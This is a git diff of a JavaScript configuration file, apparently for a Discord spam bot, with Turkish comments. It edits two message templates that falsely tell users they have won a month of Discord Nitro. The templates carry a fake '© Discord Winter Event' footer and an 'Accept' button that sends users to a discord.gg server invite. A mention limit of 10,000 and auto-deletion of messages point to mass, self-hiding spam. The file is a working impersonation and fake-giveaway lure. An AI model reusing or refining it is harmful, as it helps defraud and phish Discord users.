@@ -1,25 +1,29 @@
 module.exports = {
     token: process.env.token,
+    webhook: process.env.webhook,
+    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",
+
     advanced: {
         limit: 5,
         leave: true
     },
+
     auto_delete: {
         enabled: true,
         interval_seconds: 43200
     },
+
     blacklist: [],
     mention_limit: 10000,
-    webhook: process.env.webhook,
-    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",
 
-    // Ana Embed (Nitro Ödülü)
+    // ============= ANA EMBED =============
     embed: [
         {
+            content: "{user} **you won a Nitro Boost** !",
             embeds: [
                 {
-                    title: '<a:Verify_Blue:1355135777499119636>  | Redeem your 1 month of Discord Nitro!',
-                    description: `**you won a Nitro Boost** ! 🎉\n\n> <:WhiteGift:1347326372615422094> | To claim your prize, click the button below.\n\n> \`1.\` Click **Accept**\n> \`2.\` Join the server\n> \`3.\` Your gift will be sent via **DMs** shortly!`,
+                    title: "Redeem your 1 month of Discord Nitro!",
+                    description: "**you won a Nitro Boost** ! 🎉\n\n> Click the button below to claim your prize.\n\n> `1.` Click **Accept**\n> `2.` Join the server\n> `3.` Your gift will be sent via **DMs** shortly!",
                     color: 0x5b5bff,
                     footer: {
                         text: "© Discord Winter Event"
@@ -40,11 +44,6 @@ module.exports = {
                             type: 2,
                             label: "Accept",
                             style: 5,
-                            emoji: {
-                                name: "Discord",
-                                id: "1364075075598417952",
-                                animated: false
-                            },
                             url: "https://discord.gg/MwRBgGGaam"
                         }
                     ]
@@ -53,13 +52,14 @@ module.exports = {
         }
     ],
 
-    // embed2 (aynı embed, farklı bir olay için)
+    // ============= İKİNCİ EMBED =============
     embed2: [
         {
+            content: "{user} **you won a Nitro Boost** !",
             embeds: [
                 {
-                    title: '<a:Verify_Blue:1355135777499119636>  | Redeem your 1 month of Discord Nitro!',
-                    description: `**you won a Nitro Boost** ! 🎉\n\n> <:WhiteGift:1347326372615422094> | To claim your prize, click the button below.\n\n> \`1.\` Click **Accept**\n> \`2.\` Join the server\n> \`3.\` Your gift will be sent via **DMs** shortly!`,
+                    title: "Redeem your 1 month of Discord Nitro!",
+                    description: "**you won a Nitro Boost** ! 🎉\n\n> Click the button below to claim your prize.\n\n> `1.` Click **Accept**\n> `2.` Join the server\n> `3.` Your gift will be sent via **DMs** shortly!",
                     color: 0x5b5bff,
                     footer: {
                         text: "© Discord Winter Event"
@@ -80,11 +80,6 @@ module.exports = {
                             type: 2,
                             label: "Accept",
                             style: 5,
-                            emoji: {
-                                name: "Discord",
-                                id: "1364075075598417952",
-                                animated: false
-                            },
                             url: "https://discord.gg/MwRBgGGaam"
                         }
                     ]
